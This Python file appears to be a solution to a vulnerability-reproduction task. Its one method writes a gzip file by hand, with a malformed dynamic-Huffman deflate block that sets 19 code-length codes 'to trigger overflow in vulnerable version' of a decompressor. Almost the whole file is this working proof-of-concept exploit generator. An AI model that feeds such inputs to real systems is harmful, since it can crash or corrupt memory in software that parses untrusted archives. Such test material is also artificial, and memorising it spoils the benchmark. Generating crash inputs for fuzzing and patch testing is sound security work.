import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        def write_bits(writer, value, nbits):
            writer['bitbuf'] |= (value & ((1 << nbits) - 1)) << writer['bitcnt']
            writer['bitcnt'] += nbits
            while writer['bitcnt'] >= 8:
                writer['out'].append(writer['bitbuf'] & 0xFF)
                writer['bitbuf'] >>= 8
                writer['bitcnt'] -= 8

        # Build deflate block with dynamic Huffman trees:
        # - HCLEN = 19 (value 15), to trigger overflow in vulnerable version
        # - HLIT = 257 (value 0), HDIST = 1 (value 0)
        # Code length code lengths: only symbols 1 and 18 have length 1; others 0.
        # Code length sequence encodes:
        #   - 256 zeros using two runs of symbol 18 (138 + 118),
        #   - then '1' for literal 256,
        #   - then '1' for distance 0,
        # Data: single EOB symbol.

        writer = {'out': bytearray(), 'bitbuf': 0, 'bitcnt': 0}

        # BFINAL=1, BTYPE=2 (dynamic)
        write_bits(writer, 1, 1)   # BFINAL
        write_bits(writer, 2, 2)   # BTYPE = 2

        # HLIT=0 (257 codes), HDIST=0 (1 code), HCLEN=15 (19 code length codes)
        write_bits(writer, 0, 5)   # HLIT
        write_bits(writer, 0, 5)   # HDIST
        write_bits(writer, 15, 4)  # HCLEN

        # Code length code lengths in order:
        order = [16,17,18,0,8,7,9,6,10,5,11,4,12,3,13,2,14,1,15]
        cl_lengths = [0]*19
        cl_lengths[1] = 1
        cl_lengths[18] = 1

        for sym in order:
            write_bits(writer, cl_lengths[sym], 3)

        # Huffman for code length codes:
        # With cl_lengths[1]=1 and cl_lengths[18]=1, canonical codes are:
        #   symbol 1 -> code 0 (1 bit)
        #   symbol 18 -> code 1 (1 bit)
        code_sym1 = (0, 1)   # (code, bits)
        code_sym18 = (1, 1)  # (code, bits)

        # Encode 256 zeros: 138 + 118
        # Symbol 18 with 7 extra bits = repeat of zero length (11..138)
        # First run: 138 zeros -> extra 127
        write_bits(writer, code_sym18[0], code_sym18[1])
        write_bits(writer, 127, 7)
        # Second run: 118 zeros -> extra 107
        write_bits(writer, code_sym18[0], code_sym18[1])
        write_bits(writer, 107, 7)

        # Literal/length code lengths: set symbol 256 to length 1
        write_bits(writer, code_sym1[0], code_sym1[1])  # length 1

        # Distance code lengths: set distance 0 to length 1
        write_bits(writer, code_sym1[0], code_sym1[1])  # length 1

        # Now encode data: EOB (symbol 256) with literal/length tree containing only symbol 256 of length 1 -> code 0
        write_bits(writer, 0, 1)  # EOB

        # Flush remaining bits
        if writer['bitcnt'] > 0:
            writer['out'].append(writer['bitbuf'] & 0xFF)
            writer['bitbuf'] = 0
            writer['bitcnt'] = 0

        deflate_data = bytes(writer['out'])

        # Build GZIP wrapper
        # GZIP header: ID1 ID2 CM FLG MTIME(4) XFL OS
        header = bytes([0x1f, 0x8b, 0x08, 0x00, 0, 0, 0, 0, 0x00, 0x03])
        # Uncompressed data is empty -> CRC32=0, ISIZE=0
        crc32 = 0
        isize = 0
        trailer = struct.pack('<II', crc32, isize)

        return header + deflate_data + trailer
